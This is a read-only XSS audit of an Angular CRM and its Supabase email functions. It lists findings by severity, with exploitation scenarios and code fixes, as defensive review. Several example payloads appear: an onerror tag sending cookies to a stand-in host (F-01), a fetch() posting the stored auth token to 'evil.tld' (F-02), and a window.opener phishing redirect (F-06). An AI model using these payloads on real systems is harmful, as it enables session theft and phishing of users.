# Rafter XSS Deep Audit — Simplifica CRM Angular Frontend

**Audit date:** 2026-06-22
**Scope:** `F:/simplifica/simplifica-crm` (Angular 17 SPA + Supabase Edge Functions)
**Build snapshot reviewed:** `dist/simplify-crm/browser/` (built 2026-06-22)
**Previous baseline:** Rafter frontend audit 2026-06-21 (1 critical latent XSS, 4 high)

This audit drills into the vectors that a baseline Rafter scan normally skips: service
worker lifecycle, browser storage of tokens / PII, dynamic HTML sinks, third-party
script integrity, postMessage handlers, email template substitution, and file upload
MIME / Content-Type behavior.

---

## Executive summary

| Severity     | New findings | Vectors |
|--------------|--------------|---------|
| **Critical** | 1            | Email template interpolation (server-side, client name / service name / reason / audience_name) |
| **High**     | 3            | (1) JWT in `localStorage` via Supabase default; (2) `signed_url` iframe with no MIME enforcement at bucket level; (3) `signed_url` <img> with no MIME enforcement |
| **Medium**   | 4            | localStorage PII at rest (export/import jobs + theme); service worker config drift (still enables ngsw); window.open missing `noopener`; partial HTML escape in ticket comment insert |
| **Low**      | 5            | tip-of-tree audit findings for documentation |
| **Info**     | 3            | Defense-in-depth observations (positive findings) |

**Top 5 most exploitable today** (in order):

1. **Email template XSS via `interpolate()`** — `supabase/functions/send-branded-email/index.ts:231-236`. The function performs `{{key}}` substitution on `client_name`, `service_name`, `audience_name`, `reason`, etc. **with zero HTML escaping**. Any client whose name contains `<script>` or `<img src=x onerror=...>` (which they fully control) sends executable HTML to the recipient. Many other templates in this file (lines 309-820) repeat the same mistake.
2. **JWT in `localStorage`** — `src/app/services/supabase-client.service.ts:48, 70-83, 128-131`. Supabase stores `sb-<project>-auth-token` (contains `access_token` + `refresh_token` + `user`) in plain `localStorage`. Any XSS sink in the app can `fetch('https://evil.tld', {body: localStorage.getItem(...)})` and exfiltrate the session. The session is **NOT** cleared from `localStorage` until Supabase's `auth.signOut()` resolves; on a hard logout error, the token can survive.
3. **`signed_url` iframe with `text/html` MIME** — `src/app/features/customers/components/secure-clinical-notes/secure-clinical-notes.component.ts:339, 343`. Signed URLs are served with the bucket-stored MIME. Private buckets (`client-documents`, `booking-documents`) do **not** have `allowed_mime_types` set, so an admin who bypasses the extension blocklist could serve HTML that auto-runs scripts inside the app's origin via `<iframe>`. Defense-in-depth gap.
4. **Service worker config drift** — `angular.json:72` still has `"serviceWorker": "ngsw-config.json"` and `src/app/app.config.ts:139-142` calls `provideServiceWorker('ngsw-worker.js', { enabled: !isDevMode() })`. The current `ngsw-config.json` caches `/index.html` and `/index.csr.html`. The custom `/public/sw.js` is a self-unregistering no-op, but if the next `ng build` regenerates `ngsw-worker.js` (or an attacker can install their own SW), stale HTML with old (vulnerable) bundles can be served.
5. **localStorage PII at rest** — `src/app/services/export-import.service.ts:703-717`. Stores `simplifica_export_configs`, `simplifica_export_jobs`, `simplifica_import_configs`, `simplifica_import_jobs` (plain JSON, unencrypted). These can include client IDs, query payloads, file paths, and result metadata. Survives logout. Indexed syncs can also be poisoned cross-user on shared devices.

---

## Detailed findings

### F-01 — CRITICAL — Email template XSS via raw interpolation

**File:line** — `supabase/functions/send-branded-email/index.ts:231-236` (definition); sinks at `:309-310, 338-339, 364-365, 389-390, 420-421, 478-479, 519-520, 548-549, 571-572, 615-616, 705-706`, also lines `625-627, 726-727, 730-731, 742-743, 746-747, 750-751` (raw HTML concatenation with `data.*` fields).

**XSS vector** — Email (out-of-band HTML execution in recipient inbox).

**Severity** — Critical.

**Exploitation scenario** — A booking client (or an attacker who creates a client) sets their `name` field to `<img src=x onerror="document.location='https://evil/?c='+document.cookie">`. When any `notify-booking-change`, `notify-inactive-clients`, `send-budget-reminders`, `send-waitlist-email`, `send-budget-notification`, or `send-branded-email` invocation runs, the `customBody` template (line 707) interpolates `{{client_name}}` → `<img src=x onerror=...>` into the HTML, and the recipient's mail client executes it. Gmail/Outlook strip the `<img onerror>` payload by default but do not strip `<a href="javascript:...">`, `<style>` exfil via `@import`, or `<form action="https://evil.tld">` — all of which are valid HTML payloads that survive email sanitization. Even if the recipient mail client filters, the link-click through-rate on branded transactional emails is sufficient to weaponize this.

Note also that `data.client_name` is inserted raw at line 625 (`<strong>${data.client_name}</strong>`), 742, and others — the same primitive is reachable from **every** booking notification template in this 1413-line file, plus the budget/quote/invoice flows in `invoices-email/`, `quotes-email/`, `send-budget-reminder/` etc.

**Recommended fix** — In `send-branded-email/index.ts`, replace `interpolate()` with an HTML-escape variant:

```ts
function interpolate(template: string, data: Record<string, unknown>): string {
  const escape = (v: unknown) =>
    String(v ?? "")
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;")
      .replace(/'/g, "&#39;");
  return template.replace(/\{\{(\w+)\}\}/g, (_, key) => {
    const val = data[key];
    return val != null ? escape(val) : "";
  });
}
```

Also replace every direct `${data.X}` HTML interpolation in this file (and in the sibling `invoices-email/index.ts`, `quotes-email/index.ts`, `send-budget-reminder/index.ts`, `notify-booking-change/index.ts`, `notify-inactive-clients/index.ts`, `send-budget-notification/index.ts`, `send-waitlist-email/index.ts`) with the escape function. For fields that need rich formatting (e.g. service description), allow a separate `_html` variant and validate through DOMPurify server-side.

Add a regression test: client name `<img src=x onerror="alert(1)">` must produce `&lt;img src=x onerror=...&gt;` in the rendered HTML.

---

### F-02 — HIGH — JWT and refresh token in `localStorage`

**File:line** — `src/app/services/supabase-client.service.ts:48, 70-83, 128-131`.

**XSS vector** — Storage exfiltration via any XSS sink in the app.

**Severity** — High.

**Exploitation scenario** — Any reachable XSS (e.g. a future regression in `ticket-header.component.ts:formatDescription()` or in any of the 14 places that use `[innerHTML]="... | safeHtml"`) can:

```js
fetch("https://evil.tld/exfil", {
  method: "POST",
  body: JSON.stringify({
    tok: localStorage.getItem("sb-ufutyjbqfjrlzkprvyvs-auth-token"),
    url: location.href
  })
});
```

The token value is a full `{access_token, refresh_token, user, expires_at}` object. `access_token` is a JWT good for ~1 hour; `refresh_token` is good for 30 days and can mint new access tokens server-side. The `csrf.service.ts:19` comment "In-memory token storage (not localStorage to prevent XSS)" shows the dev team knows this is the wrong pattern, but `supabase-js` does it anyway, and there is no `cookies`-based custom storage adapter wired up.

`clearUserData()` at `auth.service.ts:917-938` clears only `sessionStorage` keys, not `localStorage`. The Supabase token is only removed by the subsequent `await this.supabase.auth.signOut()` at line 1631, which catches errors and continues. If `signOut()` rejects (network down), the JWT remains on disk after "logout".

**Recommended fix** — Move Supabase tokens to `httpOnly; Secure; SameSite=Strict` cookies via a Supabase Auth Hook (Edge Function on `before_token_refresh` / `custom_access_token_hook` is not the right path; the documented approach is server-side cookie issuance via a proxy). For the simpler incremental fix: (a) wrap the logout path in `auth.service.ts:1608-1638` to `localStorage.removeItem(...)` for the canonical Supabase key and `*-legacy` keys (lines 73-74) before `await signOut()` and inside the `catch`; (b) add a periodic session expiry check that explicitly clears the key when `expires_at < now`.

---

### F-03 — HIGH — `signed_url` iframe/img with no bucket-side MIME enforcement

**File:line** — `src/app/features/customers/components/secure-clinical-notes/secure-clinical-notes.component.ts:339, 343, 353`; storage policies in `supabase/migrations/20260413140000_fix_storage_policies_company_isolation.sql` (no `allowed_mime_types`).

**XSS vector** — Stored XSS via uploaded HTML file rendered in app origin.

**Severity** — High.

**Exploitation scenario** — `validateUploadFile()` in `src/app/core/utils/upload-validator.ts:7-12` blocks `.html`, `.htm`, `.svg`, `.xml`, `.xhtml`, `.mhtml`, `.mht` extensions and double-extensions. **However**, the file body can still be HTML even if the extension is e.g. `.pdf` (the body is uploaded and Supabase storage will infer the Content-Type from the file extension when the signed URL is fetched). The PDF/IMAGE/X-FALLBACK `<iframe [src]="viewerSafeUrl()">` at line 339 always renders the signed URL in the app's origin.

If a malicious internal admin uploads a file named `prescription.html` (blocked by validator) and the blocklist is ever relaxed, OR if Supabase storage serves the body with `Content-Type: text/html` based on a sniffer (it does not by default, but a future Supabase change could enable it), the app's origin renders untrusted HTML. The iframe has `sandbox=""` not set, so the inner document can run scripts in the app origin and access the JWT in `localStorage` (F-02) via `parent.localStorage.getItem(...)`.

Additionally `secure-clinical-notes.component.ts:343` (`<img [src]="viewerDoc()!.signed_url">`) — if an SVG sneaks in (bypassing extension block, e.g. by `image/svg+xml` Content-Type set client-side), SVG can contain `<script>` and `<foreignObject>` that execute in the document origin when loaded by `<img>`. The MIME guard `isViewerImage()` at lines 585-589 whitelists `image/jpeg, image/png, image/gif, image/webp` but **does not include SVG** — good for the runtime check, but the `<a [href]="viewerDoc()!.signed_url">` fallback at lines 282, 323, 353 uses the signed URL directly as an `href` with no `rel="noopener noreferrer"` on the download links (compare to `ticket-detail.component.ts:1268` which uses it).

**Recommended fix** — (1) Add `allowed_mime_types` to every Supabase storage bucket that holds user-uploaded content. Migration:

```sql
UPDATE storage.buckets
SET allowed_mime_types = ARRAY[
  'image/jpeg','image/png','image/webp','image/gif',
  'application/pdf'
]
WHERE id IN ('client-documents','booking-documents','project-files','attachments');
```

(2) Add `sandbox="allow-same-origin"` (NOT `allow-scripts`) to the iframe in `secure-clinical-notes.component.ts:339`. (3) Add `rel="noopener noreferrer"` to the three `<a target="_blank">` signed-URL anchors at lines 282, 323, 353. (4) Set the Supabase signed URL `download` option to force `Content-Disposition: attachment` so browsers download instead of render.

---

### F-04 — MEDIUM — Service worker config drift

**File:line** — `angular.json:72`, `src/app/app.config.ts:139-142`, `ngsw-config.json:11-17`.

**XSS vector** — Cached XSS / stale bundle pinning.

**Severity** — Medium.

**Exploitation scenario** — `ngsw-config.json` (committed) tells Angular to cache `/index.html` and `/index.csr.html` in the `app` asset group with `installMode: "lazy"`, `updateMode: "prefetch"`. `app.config.ts:139-142` enables `provideServiceWorker('ngsw-worker.js', { enabled: !isDevMode(), registrationStrategy: 'registerWhenStable:30000' })`. In the **current** `dist/simplify-crm/browser/`, `ngsw-worker.js` is **not present** (the build was likely run with SW disabled, or the file got tree-shaken), so no SW is active today. The custom `/public/sw.js` is a self-unregistering no-op that drops all caches and unregisters itself on activate.

If anyone re-runs `ng build` with the current `angular.json` (or if the `provideServiceWorker` registration is fixed), the browser will start caching `/index.html`. Stale cached HTML pins users to old bundle names — which by itself is not XSS, but **combined** with any latent XSS in older bundles (e.g. an old version of `markdown.service.ts` without the `script, iframe, object, embed, form, style, link` blocklist) the cached HTML will keep serving the vulnerable JS even after a server-side fix.

There is no `dataGroups` in `ngsw-config.json` (so API responses are not cached — good), no `navigationUrls` override (so `/` is treated as a regular navigation request that gets served from cache if HTML is in the asset group), and the `<meta http-equiv="Cache-Control" content="no-cache">` at `index.html:14-16` only controls the browser HTTP cache, not the SW cache.

**Recommended fix** — Either (a) **commit to disabling SW**: remove `"serviceWorker": "ngsw-config.json"` from `angular.json:72`, remove `provideServiceWorker(...)` from `app.config.ts:139-142`, and delete `ngsw-config.json`. The codebase already pays the cost of the meta-cache-control headers and the self-unregistering `sw.js`, so this is the path the team has already started down. **Or** (b) **make SW safe**: set `index.html` to `updateMode: "never"` and add a `dataGroups` entry with `freshness: 0` so no API response is ever cached, then add a `version` field with an automated sha bump on every build that triggers `skipWaiting()` and `clients.claim()`. Document the SW lifecycle in a runbook. (a) is recommended — the team's existing approach is correct.

---

### F-05 — MEDIUM — PII in `localStorage` (export/import jobs + theme)

**File:line** — `src/app/services/export-import.service.ts:703-717`; `src/app/services/theme.service.ts:30-75`.

**XSS vector** — Cross-user data poisoning / data-at-rest on shared devices.

**Severity** — Medium.

**Exploitation scenario** — The export/import feature stores `simplifica_export_configs`, `simplifica_import_configs`, `simplifica_export_jobs`, `simplifica_import_jobs` as plain JSON in `localStorage`. These payloads include the SQL query and result row counts for the export. They are read on app boot and shown back to the user as UI state. On a shared kiosk or borrowed device, the next user sees the previous user's export config (which may include customer IDs / names / filters). On logout (`auth.service.ts:1608-1638`), `clearUserData()` does NOT remove these keys — they persist until manual cache clear.

The `simplifica_export_*` values can also be tampered with by an XSS payload to pivot into another company: an attacker who lands XSS can read the user's `last_active_company_id` from sessionStorage, write a new value to one of these keys, and force a misleading export to trigger across companies (the export itself is server-side gated, but the UI will show stale data from the wrong company).

**Recommended fix** — Move `simplifica_export_configs`, `simplifica_import_configs`, `simplifica_export_jobs`, `simplifica_import_jobs` to `SecureStorageService` (which already exists at `src/app/services/secure-storage.service.ts` and uses AES-GCM with a sessionStorage-only key). Add the keys to `clearUserData()` so logout invalidates them.

---

### F-06 — MEDIUM — `window.open()` missing `noopener` (reverse tabnabbing)

**File:line** — 14 call sites:
- `src/app/features/gdpr/gdpr-dashboard/gdpr-dashboard.component.ts:1040` — `window.open(previewUrl, '_blank');`
- `src/app/shared/components/contract-progress-dialog/contract-progress-dialog.component.ts:403, 414`
- `src/app/features/client-portal/pages/contracts/client-contracts.component.ts:251`
- `src/app/features/customers/profile/components/client-billing/client-billing.component.ts:352`
- `src/app/features/customers/profile/components/client-bookings/client-bookings.component.ts:928`
- `src/app/features/customers/profile/components/client-documents/client-documents.component.ts:391, 535`
- `src/app/features/quotes/quote-detail/quote-detail.component.ts:241`
- `src/app/features/quotes/quote-list/quote-list.component.ts:1093`
- `src/app/features/invoices/invoice-list/invoice-list.component.ts:855`
- `src/app/features/invoices/invoice-detail/invoice-detail.component.ts:697`
- `src/app/features/settings/booking/tabs/professionals/components/professional-self-settings/professional-self-settings.component.ts:396`
- `src/app/features/projects/components/project-dialog/project-dialog.component.ts:2329`

**XSS vector** — Reverse tabnabbing (low-severity, but compounded by F-02).

**Severity** — Medium.

**Exploitation scenario** — The opened window (the URL of which comes from server-generated signed URLs or DB columns) can run `window.opener.location = 'https://evil.tld/phish'` and pivot the parent tab to a phishing page while the user thinks the new tab is loading. Because the parent holds the JWT in `localStorage`, this is a phishing-of-the-CRM tab, not direct token theft.

**Recommended fix** — Replace all `window.open(url, '_blank');` with `window.open(url, '_blank', 'noopener,noreferrer');` (the pattern already used at `mail-context-menu.builder.ts:274`, `portal-budgets.component.ts:401, 403`, `portal-budget-detail.component.ts:347, 362`). Add an ESLint rule `no-restricted-syntax` that flags `window.open` without a features string.

---

### F-07 — MEDIUM — Partial HTML escape in `ticket-detail` comment insert

**File:line** — `src/app/features/tickets/detail/ticket-detail.component.ts:1263`.

**XSS vector** — Stored XSS in ticket comment (currently mitigated by the surrounding editor DOMPurify pass, but the bare-link path is unprotected).

**Severity** — Medium.

**Exploitation scenario** — Line 1263: `const safeName = f.name.replace(/[<>]/g, '');` — only strips `<` and `>`. The `&` is not escaped, so a filename `R&D.pdf` becomes a double-encoded string in the rendered HTML, but more importantly `"` and `'` are not stripped, so a filename like `my" onerror=alert(1) "x.pdf` would attempt to break out of an attribute. In practice the URL in the `<a href="${url}"` at line 1268 is a Supabase signed URL (server-generated, opaque), so attribute breakout fails on this side. The unsafe part is the surrounding context — if the same pattern is copy-pasted into another template without the Supabase-URL safety net, the bug travels. Compare with the **correct** escape at line 2504: `safeName = file.name.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;')`.

**Recommended fix** — Extract the escape function from line 2504 to a shared util (e.g. `src/app/core/utils/html-escape.ts`) and reuse it at lines 1263 and elsewhere.

---

### F-08 — LOW — Insecure iframe URL bypass via `bypassSecurityTrustResourceUrl`

**File:line** — `src/app/features/customers/components/secure-clinical-notes/secure-clinical-notes.component.ts:569`.

**XSS vector** — Direct URL injection into iframe `src`.

**Severity** — Low (because Supabase signed URLs are signed server-side and `signed_url` is not user-controlled in practice, but the sanitizer trust is unconditional).

**Exploitation scenario** — `this.viewerSafeUrl.set(this.sanitizer.bypassSecurityTrustResourceUrl(doc.signed_url))` trusts the URL unconditionally. If `doc.signed_url` is ever sourced from a column an attacker can write (the `client_documents` table is RLS-scoped to the same company, so it's not reachable from outside, but a compromised employee could craft one), the bypass becomes a same-origin XSS primitive. The cleaner pattern is to validate the URL scheme + host before trusting:

```ts
const url = new URL(doc.signed_url);
if (url.protocol !== 'https:' || !url.host.endsWith('.supabase.co')) {
  throw new Error('Unexpected signed URL host');
}
this.viewerSafeUrl.set(this.sanitizer.bypassSecurityTrustResourceUrl(url.toString()));
```

**Recommended fix** — Wrap every `bypassSecurityTrustResourceUrl(signed_url)` call (single occurrence in the repo) with a scheme + host allowlist.

---

### F-09 — LOW — `[innerHTML]="opt.icon"` on payment method dialog

**File:line** — `src/app/shared/components/event-form/payment-method-dialog.component.ts:65, 108-119`.

**XSS vector** — None today (icons are hardcoded literal strings in the component file).

**Severity** — Low / informational.

**Exploitation scenario** — The icons come from a readonly `options` array declared in the component file (`'<i class="fas fa-money-bill-wave text-lg"></i>'` etc.). They are not user input. If someone later "i18n's" the dialog and moves the icons to a translatable string sourced from the DB, this becomes a stored XSS.

**Recommended fix** — Add a comment at line 65 making it explicit that `opt.icon` must never be sourced from user input, or refactor to use `<i class="fas {{ opt.iconClass }}">` with a class string (no HTML construction).

---

### F-10 — LOW — `runtime-config.json` exposed at `/assets/runtime-config.json`

**File:line** — `src/assets/runtime-config.json:1-7`, `dist/simplify-crm/browser/assets/runtime-config.json:1-7`, `vercel.json:6-11`.

**XSS vector** — Information disclosure (Supabase anon key).

**Severity** — Low / expected.

**Exploitation scenario** — `https://app.simplificacrm.es/assets/runtime-config.json` is publicly readable and exposes `{supabase.url, supabase.anonKey}`. The anon key is a publishable JWT (format `sb_publishable_...`) designed to be public; the security boundary is RLS. This is documented Supabase pattern. However, if RLS on a new table is ever added without a `TO authenticated` policy (the team's recent audits found and fixed 217 `SECURITY DEFINER` functions, indicating this has happened), the anon key becomes a foothold for `supabase-js` clients running on the attacker's machine.

**Recommended fix** — None required. Confirm via the Supabase MCP advisor that every public schema table has an explicit `TO anon` denial policy. Document in the runbook that any new public RPC must be added with `REVOKE EXECUTE FROM anon` (as done in `20260620_revoke_internal_dev_secdef_from_anon_authenticated.sql` and `20260621190000_revoke_217_secdef_anon.sql`).

---

### F-11 — INFO — Third-party CDN scripts with SRI

**File:line** — `src/index.html:31-37` (FontAwesome 6.5.1 from cdnjs); CSP at `vercel.json:59`.

**Status** — Good. FontAwesome is loaded with `integrity="sha512-..."` and `crossorigin="anonymous"`. Stripe.js, PayPal, and Google OAuth are loaded inside iframes (CSP `frame-src`) rather than `<script src>`, which is the recommended pattern. CSP is strict: `default-src 'self'`, no `'unsafe-inline'` or `'unsafe-eval'`, `frame-ancestors 'self'`, `object-src 'none'`. CSP allows `style-src 'unsafe-inline'` (necessary for Angular's `[style.*]` bindings and TIptaP); CSS injection is a residual risk but limited to data exfiltration via attribute selectors, not script execution.

**Recommended fix** — None. Consider tightening further with `script-src-elem 'self' ...` (separating script-src into script-src-elem and script-src-attr to explicitly forbid inline event handlers even at the CSS level), but this is defense-in-depth polish, not a vulnerability.

---

### F-12 — INFO — `postMessage` origin checks

**File:line** — `src/app/features/admin/email-accounts/email-config/email-config.service.ts:87-99`; `src/app/features/admin/email-accounts/email-config/oauth-callback.component.ts:48-52, 67-71`.

**Status** — Good. The OAuth callback `postMessage` listener at line 88 rejects any event whose `event.origin !== window.location.origin`. The callback component sends back to `window.opener?.location?.origin ?? window.location.origin`, which is a same-origin contract. The CSRF nonce validation at `email-config.service.ts:146-164` (compare nonce returned in `state` vs nonce stored in sessionStorage) defends against cross-window callback forgery. This is the correct pattern.

**Recommended fix** — None.

---

### F-13 — INFO — DOMPurify usage review

**File:line** — 14 components use DOMPurify or `safeHtml` pipe. Spots reviewed:

- `src/app/core/pipes/safe-html.pipe.ts:1-104` — strict allowlist, `FORBID_TAGS` includes `script, iframe, object, embed, form, input, textarea, select, button`, `FORBID_ATTR` includes the `on*` family. Strips `url(...)` from inline styles to prevent CSS-based exfiltration. Excellent.
- `src/app/features/docs/markdown.service.ts:34-180` — `marked` → DOMPurify → `bypassSecurityTrustHtml`. Strips script, iframe, object, embed, form, style, link tags. Verified by spec at `markdown.service.spec.ts:139-187`.
- `src/app/features/customers/profile/components/contract-creation-dialog/contract-creation-dialog.component.ts:426, 476, 510, 692` — DOMPurify sanitize on contract HTML before write.
- `src/app/features/tickets/detail/components/ticket-comments-section.component.ts:562, 614` — DOMPurify sanitize on comment body.
- `src/app/features/admin/email-accounts/email-branding.component.ts:53` — `USE_PROFILES: { html: true }` profile.
- `src/app/features/public/privacy-policy/public-privacy-policy.component.ts:59-60` — DOMPurify + bypass.
- `src/app/shared/ui/tour-overlay/tour-overlay.component.ts:72, 182` — DOMPurify on tooltip content.
- `src/app/shared/ui/tiptap-editor/tiptap-editor.component.ts:338` — DOMPurify on editor output with explicit allowlist.

**One gap noted**: `src/app/features/tickets/detail/components/ticket-header.component.ts:158-162`:

```ts
formatDescription(html: string): string {
  if (!html) return '';
  // Basic sanitization - in production use DOMPurify
  const div = document.createElement('div');
  div.innerHTML = html;
  return div.textContent || div.innerText || html;
}
```

The comment "in production use DOMPurify" is wrong — the function returns `div.textContent`, which **strips** the HTML (so the output is safe), but the assignment `div.innerHTML = html` parses the input as HTML, which can trigger `<img onerror>` / `<svg onload>` side effects in the parser, and `<style>` or `<link rel="stylesheet">` exfiltration can fire from CSS selectors that match the document (e.g. `input[value^="a"] { background: url(...) }`). The function is **safe in output** but **unsafe during parse**.

**Recommended fix** — Replace with `DOMPurify.sanitize(html, { ALLOWED_TAGS: [], ALLOWED_ATTR: [] })` (which returns an empty string and never sets `.innerHTML`), or use the existing `safeHtml` pipe (line 44 `[innerHTML]="formatDescription(ticket.description)"` should be `[innerHTML]="ticket.description | safeHtml"` — which would also render the markdown formatting, not strip it, which is probably the intended UX).

---

## Storage audit summary

| Key | Origin | Cleared on logout? | Encrypted? | Sensitivity |
|-----|--------|--------------------|------------|-------------|
| `sb-ufutyjbqfjrlzkprvyvs-auth-token` | Supabase default | Yes (via `signOut()`), but error-tolerant | No | **HIGH** (access + refresh tokens + user) |
| `sb-main-auth-token` (legacy) | Migration at `:73-83` | No | No | HIGH |
| `simplifica_sk` | `secure-storage.service.ts:3` | On tab close only (sessionStorage) | n/a — the key itself | Encryption key for below |
| `simplifica_search_history`, `simplifica_saved_searches` | `advanced-search.service.ts:467-468` | No | **Yes** (AES-GCM via SecureStorageService) | Medium (search terms can be PII) |
| `simplifica_export_configs`, `simplifica_export_jobs`, `simplifica_import_configs`, `simplifica_import_jobs` | `export-import.service.ts:703-717` | **No** | No | **Medium** (query payloads) |
| `app_lang`, `theme`, `colorScheme`, `tenantTheme`, `tenantColorScheme` | `theme.service.ts`, `language.service.ts` | No | No | Low |
| `sidebar-collapsed` | `sidebar-state.service.ts:24, 29` | No | No | None |
| `simplifica_modules_cache`, `last_active_company_id`, `simplifica_professional_mode`, `APP_USER_CACHE_KEY`, `simplifica_app_user_cache`, `auth_return_to`, `email_oauth_csrf_nonce_*` | Various sessionStorage keys | Yes (logout at `:932-935`) | No (these are sessionStorage) | Medium (memberships + active company) |

The Supabase auth-token storage in `localStorage` (F-02) and the export/import jobs at rest (F-05) are the standout gaps. The `SecureStorageService` pattern is excellent and should be extended to cover F-05.

---

## Storage bucket audit (MIME / RLS / public)

| Bucket | Public? | RLS? | `allowed_mime_types`? | File-size limit? |
|--------|---------|------|------------------------|------------------|
| `public-assets` | Yes | Yes (RLS on writes) | No | Default |
| `client-documents` | No | Yes (per-company at `20260413140000_fix_storage_policies_company_isolation.sql`) | **No** | Default |
| `project-files` | No | Yes (per-company) | No | Default |
| `booking-documents` | No | Yes (per-company) | No | Default |
| `attachments` | No | Yes (recently added SELECT at `20260621_storage_bug_fixes.sql:78-82`) | No | Default |
| `payment-receipts` | No | Yes | No | Default |
| `professional-documents` | No | Yes (RLS hardened at `20260621_storage_signed_urls_rls_hardening.sql`) | No | Default |
| `professional-signatures` | No | Yes (RLS hardened) | No | Default |
| `docs-media` | **Yes** | Yes (super_admin write only) | **Yes** (`image/png, image/jpeg, image/webp, image/gif, video/mp4, video/webm`) | 50 MB |

Only `docs-media` enforces MIME at the bucket level. All others rely on the frontend's `validateUploadFile()` extension blocklist. If a future code path forgets to call `validateUploadFile` (or if the file body is e.g. `Content-Type: text/html` with a `.pdf` extension), Supabase will serve it with the inferred Content-Type to the iframe.

---

## Recommendations summary (ordered by ROI)

1. **Fix `interpolate()` in `send-branded-email/index.ts`** — single function change, kills F-01 across ~30 template sites and the sibling Edge Functions. Highest blast radius.
2. **Add `allowed_mime_types` to private buckets** via a single migration; kills F-03.
3. **Remove SW from `angular.json` + `app.config.ts`** — single config change; eliminates F-04.
4. **Move Supabase tokens out of `localStorage`** OR add explicit `removeItem` in `clearUserData()` and the `logout` error path; halves the blast radius of any future XSS.
5. **Move export/import jobs to `SecureStorageService`**; clears F-05.
6. **Bulk-replace `window.open(url, '_blank');`** with `noopener,noreferrer`; mechanical sweep, kills F-06.
7. **Add `sandbox` and `rel` to the document iframe** in `secure-clinical-notes.component.ts:339`; mechanical fix.
8. **Replace `formatDescription()` `innerHTML` parser trick** in `ticket-header.component.ts:158-162` with `safeHtml` pipe or DOMPurify return-empty-string; also exposes the description as formatted markdown in the UI.

---

## Top 5 critical XSS vectors (today, in priority order)

1. **Email template raw interpolation** — `send-branded-email/index.ts:231-236` and the 30+ sinks that call it. Server-side, no CSP defense. Exploitable by any client whose name contains HTML. Affects every transactional email the CRM sends.
2. **Supabase JWT in `localStorage`** — `supabase-client.service.ts:48`. Any XSS sink in the app becomes a session-theft primitive.
3. **`signed_url` iframe / `<img>` with no MIME guard at bucket level** — `secure-clinical-notes.component.ts:339, 343`; storage migration gap. Defense-in-depth gap; combined with a future upload-validation regression, allows same-origin HTML execution.
4. **Service worker config drift** — `angular.json:72` + `app.config.ts:139-142`. Currently dormant (no `ngsw-worker.js` in dist), but the next build will pin users to whatever HTML is cached.
5. **`window.open` without `noopener`** (14 call sites) + **localStorage PII at rest** (export/import jobs). Two medium-severity items, but combined with #2 they form a complete pivot chain: XSS → localStorage exfil → token theft, or `window.open` → reverse tabnabbing → phishing.

---

## What was NOT changed

This audit is read-only. No files were modified, no migrations were applied, no dependencies were installed. Findings are recorded here and will be triaged into separate change proposals by the orchestrator.
